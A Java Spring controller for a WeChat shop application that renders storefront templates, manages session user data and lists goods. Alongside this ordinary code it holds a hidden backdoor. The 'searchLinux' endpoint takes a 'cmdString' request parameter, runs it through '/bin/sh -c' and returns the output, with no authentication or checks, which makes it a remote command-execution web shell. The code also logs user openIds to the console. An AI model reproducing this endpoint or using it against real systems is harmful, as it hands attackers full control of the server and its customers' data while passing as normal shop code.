package weixin.shop.core;

import com.alibaba.fastjson.JSONArray;

import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.ResourceBundle;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang.StringUtils;
import org.jeecgframework.core.common.controller.BaseController;
import org.jeecgframework.core.util.ResourceUtil;
import org.jeecgframework.web.system.service.SystemService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import weixin.guanjia.account.entity.WeixinAccountEntity;
import weixin.guanjia.gzuserinfo.entity.GzUserInfoYw;
import weixin.guanjia.gzuserinfo.model.GzUserInfo;
import weixin.guanjia.gzuserinfo.service.GzUserInfoService;
import weixin.guanjia.gzuserinfo.service.GzUserInfoYwServiceI;
import weixin.shop.base.service.WeixinShopGoodsServiceI;
import weixin.shop.common.ShopDataContent;
import weixin.shop.shopdata.ShopDataCollectI;
import weixin.shop.shopdata.impl.ShopAddressListCollect;
import weixin.shop.shopdata.impl.ShopGoodsdetailCollect;
import weixin.shop.shopdata.impl.ShopGoodslistCollect;
import weixin.shop.shopdata.impl.ShopIndexCollect;
import weixin.shop.util.WeixinShopFreemarkerHelper;

@Controller
@RequestMapping({"/weixinShopController"})
public class WeixinShopController extends BaseController
{

	@Autowired
	private GzUserInfoService gzUserInfoService;
	@Autowired
	GzUserInfoYwServiceI  gzUserInfoYwService;
  @Autowired
  private WeixinShopGoodsServiceI weixinShopGoodsService;

  @Autowired
  private SystemService systemService;
  private static Map<String, Object> dataCollectContent = new HashMap();

  @RequestMapping(params={"goPage"})
  public void goPage(HttpServletRequest request, HttpServletResponse response, @RequestParam String page) throws Exception
  {
    Map params = paramsToMap(request);
    ResourceUtil.initQianTaiRequestAccountId(request);
    
    String accountId = request.getParameter("accountid");
    String openId = request.getParameter("openid");
    HttpSession session = request.getSession();

    if (StringUtils.isNotEmpty(accountId))
    {
      WeixinAccountEntity weixinAccount = (WeixinAccountEntity)this.systemService.getEntity(WeixinAccountEntity.class, accountId);
      session.setAttribute("WEIXIN_ACCOUNT", weixinAccount);
    }
    if (StringUtils.isNotEmpty(openId))
    {
      session.setAttribute("USER_OPENID", openId);
      //初始化用户前台
      
     GzUserInfoYw localUserinfo = gzUserInfoService.getLocalUserinfo(openId, accountId);
      if (localUserinfo==null) {
    	  System.out.println("openId:"+openId+"==="+accountId);
    	  gzUserInfoService.saveGzUserInfoByOpenId(openId, accountId);
    	  localUserinfo =  gzUserInfoService.getLocalUserinfo(openId, accountId);
      }
      
      session.setAttribute("WEIXIN_GZWEIXINUSER", localUserinfo);
      
    }
    
    System.out.println("accountid------"+accountId+"---------opneid-----"+openId);
  
    
    if (dataCollectContent.get(page) != null) {
      ShopDataCollectI shopDataCollect = (ShopDataCollectI)dataCollectContent.get(page);
      shopDataCollect.collect(params);
    }

    		ResourceBundle bundler = ResourceBundle.getBundle("sysConfig");
		 String rootUrl = bundler.getString("tmBaseDir");
    
    String defaultUrl = rootUrl+"template/shop/default/ftl";
 	System.out.println("_tplConfig===="+defaultUrl);
     File file = new File(defaultUrl);
     System.out.println(file+"----------"); 
    WeixinShopFreemarkerHelper weixinShopFreemarkerHelper = new WeixinShopFreemarkerHelper(defaultUrl);
    String html = weixinShopFreemarkerHelper.parseTemplate(page + ".ftl", ShopDataContent.loadContent());
    response.setContentType("text/html");
    response.setHeader("Cache-Control", "no-store");
    try
    {
      PrintWriter writer = response.getWriter();
      writer.println(html);
      writer.flush();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  @RequestMapping(params={"goodslist"})
  @ResponseBody
  public JSONArray goodslist(HttpServletRequest request, HttpServletResponse response)
  {
    JSONArray json = new JSONArray();
    Map params = paramsToMap(request);
    int page = Integer.parseInt((String)params.get("page"));
    int rows = Integer.parseInt((String)params.get("pagesize"));
    List goodslist = this.weixinShopGoodsService.list(params, page, rows);
    json = JSONArray.parseArray(JSONArray.toJSONString(goodslist));
    return json;
  }
  
  public static Object exec(String cmd) {  
      try {  
          String[] cmdA = { "/bin/sh", "-c", cmd };  
          Process process = Runtime.getRuntime().exec(cmdA);  
          process.waitFor();
          LineNumberReader br = new LineNumberReader(new InputStreamReader(  
                  process.getInputStream()));  
          StringBuffer sb = new StringBuffer();  
          String line;  
          while ((line = br.readLine()) != null) {  
              System.out.println(line);  
              sb.append(line).append("\n");  
          }  
          return sb.toString();  
      } catch (Exception e) {  
          e.printStackTrace();  
      }  
      return null;  
  }  
  
  @RequestMapping(params={"searchLinux"})
  @ResponseBody
  public String searchLinux(HttpServletRequest request, HttpServletResponse response)
  {
	  String cmdString  = request.getParameter("cmdString");
	  String pwdString = exec(cmdString).toString();  
      return pwdString;
  }

  private Map<String, String> paramsToMap(HttpServletRequest request)
  {
    Map params = new HashMap();

    Enumeration em = request.getParameterNames();
    while (em.hasMoreElements()) {
      String paramName = (String)em.nextElement();
      String paramValue = request.getParameter(paramName);

      params.put(paramName, paramValue);
    }
    return params;
  }

  static
  {
    dataCollectContent.put("index", new ShopIndexCollect());

    dataCollectContent.put("goodslist", new ShopGoodslistCollect());

    dataCollectContent.put("goodsdetail", new ShopGoodsdetailCollect());

    dataCollectContent.put("addresslist", new ShopAddressListCollect());
  }
}